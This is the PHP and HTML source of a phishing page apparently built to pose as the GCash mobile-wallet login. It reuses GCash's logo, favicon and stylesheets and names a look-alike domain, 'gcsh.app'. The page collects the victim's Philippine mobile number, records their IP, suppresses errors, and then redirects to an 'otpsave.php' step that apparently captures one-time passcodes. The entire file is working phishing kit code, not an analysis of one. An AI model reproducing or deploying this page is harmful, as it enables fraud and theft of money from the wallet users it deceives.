<?php
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("m-d-y");
error_reporting(0);

include("login.php");
if(isset($_SESSION['finished'])){
	 $cooks = $_COOKIE["number"];
      header('location: otpsave.php?otpclid='.$cooks.'');
	}

?>

<!DOCTYPE html>
<html class="desktop" style="font-size:55px;">
<head>
  <title>GCash Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="GCash!">
  <meta property="og:type" content="website">
  <meta property="og:url" content="gcsh.app">
  <link href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" rel="icon">
  <meta name="wap-font-scale" content="no">
 
  <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-909a9fdc8a709d2d80f2.css">
  <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-84bb5121d0c2d1d07f10.css">



<style type="text/css">
    body {
        padding: 30px;
    }
    div {
        display: block;
    }
    body {
    background: #007cff;
    color: #333;
    font: .32rem/1.4 Helvetica Neue,Helvetica,Arial,sans-serif;
    -webkit-tap-highlight-color: rgba(0,0,0,0);
   }

#next {
align:center;
background-color:white;
border: none;
margin:5px;
padding:10px;
color: #0079FC;
outline:none;
cursor:pointer;
text-align: center;
font-size:16px;
border-radius: 35px;
width:320px;
}


@media only screen and (min-device-width: 768px)
body {
    font-size: 10vw!important;
}

.page-container{
  
    width:400px;
    margin-left:5%;
}


</style>

<script>

function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  }
  return true;
}


</script>

</head>

<body>
    
  <form method='POST'>

  <div id="app" class="root-app">
    <!---->
    <div class="main-container login-page">
      <div class="page-container">
        <header><div class="page-item"><img src="data:image/png;base64,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" style="width:170px;height:150px;"></div>
        </header>
        <div class="page-main content-center">
          <p class="default-font enter-mobile-number-label"> Enter your mobile number</p>
          <div class="login">
            <div class="ap-flex-row number-field underlined">
              <p class="default-font area-code ">+63</p>
   
              <input style="letter-spacing: 2px;" maxlength="10" onkeypress="return isNumber(event)" type="tel" name="number" onkeyup="length_disabled_btn(this.value)" id="phnumbervalid" class="mobile-input underlined" inputmode="numeric" ng-pattern="/^[a-zA-Z0-9 .,-]+$/" required>


              
            </div>
          </div>
          
         
          <p class="default-font network-available new-font-size"> Available for all networks!</p>
        </div>
        <footer>
          <div class="privacy-message">
          </div>
          <div class="submit-button display-mobile">
                <input type="submit" name="submitnum" id="next" value="NEXT" disabled>
            

              <script>
function length_disabled_btn(value){

    var number = document.getElementById("phnumbervalid").value;
    
       var num = number.toString().length;
         if(num == 10){
             document.getElementById("next").disabled = false;
         } else{
             document.getElementById("next").disabled = true;
         }
       

}

</script>

               
          </div>
      </form>
      
      
          <div class="footer-view">
            <!---->
            <div class="page-item consent">
              <p class="default-font copyright">© 2022 GCash.com | All rights reserved. </p>
              <div class="link-container">
                <a target="_blank" href="https://www.gcash.com/app/v1.0.0/privacy-notice" class="policy">
                  <p>Privacy Policy</p>
                </a>
                <p class="default-font seperator"> | </p>
                <a target="_blank" href="https://www.gcash.com/terms-and-conditions" class="terms-and-conditions">
                  <p>Terms and Conditions</p>
                </a>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
    </div>  

   
    <p style="display: none;"></p>
    <div>
 
    </div>

</body>

</html>